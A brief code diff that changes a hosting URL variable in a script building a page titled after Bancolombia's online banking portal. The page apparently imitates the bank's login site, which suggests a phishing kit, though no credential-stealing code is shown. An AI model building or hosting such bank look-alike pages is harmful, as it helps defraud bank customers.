@@ -1,4 +1,4 @@
-var myHosting = "https://mysite-yue.pages.dev/";
+var myHosting = "https://itsmariodev.github.io/";
 
 let head = `
 <title>Bancolombia Sucursal Virtual Personas</title>
